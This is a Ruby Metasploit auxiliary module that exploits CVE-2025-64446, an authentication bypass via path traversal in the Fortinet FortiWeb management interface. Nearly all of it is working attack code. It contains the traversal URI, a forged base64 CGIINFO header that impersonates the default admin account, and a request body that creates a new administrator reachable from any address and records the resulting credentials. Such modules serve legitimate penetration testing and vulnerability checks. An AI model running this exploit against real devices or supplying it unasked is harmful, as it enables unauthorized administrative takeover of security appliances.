##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Fortinet FortiWeb create new local admin',
        'Description' => %q{
          This auxiliary module exploits an authentication bypass via path traversal vulnerability in the Fortinet
          FortiWeb management interface to create a new local administrator user account. This vulnerability affects the
          following versions:

          * FortiWeb 8.0.0 through 8.0.1 (Patched in 8.0.2 and above)
          * FortiWeb 7.6.0 through 7.6.4 (Patched in 7.6.5 and above)
          * FortiWeb 7.4.0 through 7.4.9 (Patched in 7.4.10 and above)
          * FortiWeb 7.2.0 through 7.2.11 (Patched in 7.2.12 and above)
          * FortiWeb 7.0.0 through 7.0.11 (Patched in 7.0.12 and above)
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Defused', # PoC from honeypot
          'sfewer-r7', # MSF module
        ],
        'References' => [
          ['CVE', '2025-64446'],
          ['URL', 'https://x.com/defusedcyber/status/1975242250373517373'], # Original PoC posted online
          ['URL', 'https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass'], # PoC
          ['URL', 'https://www.pwndefend.com/2025/11/13/suspected-fortinet-zero-day-exploited-in-the-wild/'],
          ['URL', 'https://www.rapid7.com/blog/post/etr-critical-vulnerability-in-fortinet-fortiweb-exploited-in-the-wild/'],
          ['URL', 'https://www.fortiguard.com/psirt/FG-IR-25-910'] # Vendor Advisory
        ],
        'DisclosureDate' => '2025-11-14', # Vendor disclosed Nov 14, 2025, fixes were several months prior.
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('NEW_USERNAME', [true, 'Username to use when creating a new admin account', Faker::Internet.username]),
      OptString.new('NEW_PASSWORD', [true, 'Password to use when creating a new admin account', Rex::Text.rand_text_alpha(8)])
    ])

    register_advanced_options(
      [
        OptString.new('FORTIWEB_ACCESS_PROFILE', [ true, 'The access profile to use for the new admin account', 'prof_admin' ]),
        OptString.new('FORTIWEB_DOMAIN', [ true, 'The domain to use for the new admin account', 'root' ]),
        OptString.new('FORTIWEB_DEFAULT_ADMIN_ACCOUNT', [ true, 'The default FortiWeb admin account name', 'admin' ])
      ]
    )
  end

  def check
    res = post_auth_bypass_request({ data: {} })

    return CheckCode::Unknown('Connection failed') unless res

    return Exploit::CheckCode::Safe('Received a 403 Forbidden response') if res.code == 403

    Exploit::CheckCode::Appears
  end

  def run
    request_data = {
      data: {
        'q_type' => 1,
        'name' => datastore['NEW_USERNAME'],
        'access-profile' => datastore['FORTIWEB_ACCESS_PROFILE'],
        'access-profile_val' => '0',
        'trusthostv4' => '0.0.0.0/0',
        'trusthostv6' => '::/0',
        'last-name' => '',
        'first-name' => '',
        'email-address' => '',
        'phone-number' => '',
        'mobile-number' => '',
        'hidden' => 0,
        'domains' => datastore['FORTIWEB_DOMAIN'],
        'sz_dashboard' => -1,
        'type' => 'local-user',
        'type_val' => '0',
        'admin-usergrp_val' => '0',
        'wildcard_val' => '0',
        'accprofile-override_val' => '0',
        'sshkey' => '',
        'passwd-set-time' => 0,
        'history-password-pos' => 0,
        'history-password0' => '',
        'history-password1' => '',
        'history-password2' => '',
        'history-password3' => '',
        'history-password4' => '',
        'history-password5' => '',
        'history-password6' => '',
        'history-password7' => '',
        'history-password8' => '',
        'history-password9' => '',
        'force-password-change' => 'disable',
        'force-password-change_val' => '0',
        'password' => datastore['NEW_PASSWORD']
      }
    }

    res = post_auth_bypass_request(request_data)

    return fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Connection failed.') unless res

    return fail_with(Msf::Exploit::Failure::NotVulnerable, 'Target does not appear vulnerable (403 Forbidden response)') if res.code == 403

    unless res.code == 200
      if res.headers['Content-Type'] == 'application/json'
        begin
          response_data = JSON.parse(res.body)
          print_bad(response_data.to_s)
        rescue JSON::ParserError
          print_bad('failed to parse response JSON data')
        end
      end
      return fail_with(Msf::Exploit::Failure::UnexpectedReply, "Target returned an unexpected response (#{res.code})")
    end

    print_good("New admin account successfully created: #{datastore['NEW_USERNAME']}:#{datastore['NEW_PASSWORD']}")

    print_good("Login via #{ssl ? 'https' : 'http'}://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{normalize_uri(target_uri.path, 'login')}")

    store_credentials(datastore['NEW_USERNAME'], datastore['NEW_PASSWORD'], Metasploit::Model::Login::Status::UNTRIED)
  end

  def post_auth_bypass_request(request_data)
    cgi_info = {
      'username' => datastore['FORTIWEB_DEFAULT_ADMIN_ACCOUNT'],
      'profname' => datastore['FORTIWEB_ACCESS_PROFILE'],
      'vdom' => datastore['FORTIWEB_DOMAIN'],
      'loginname' => datastore['FORTIWEB_DEFAULT_ADMIN_ACCOUNT']
    }

    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi'),
      'headers' => {
        'CGIINFO' => Base64.strict_encode64(cgi_info.to_json)
      },
      'ctype' => 'application/json',
      'data' => request_data.to_json
    )
  end

  def store_credentials(username, password, login_status)
    service_data = {
      address: datastore['RHOST'],
      port: datastore['RPORT'],
      service_name: ssl ? 'https' : 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: username,
      private_data: password,
      private_type: :password
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: login_status
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
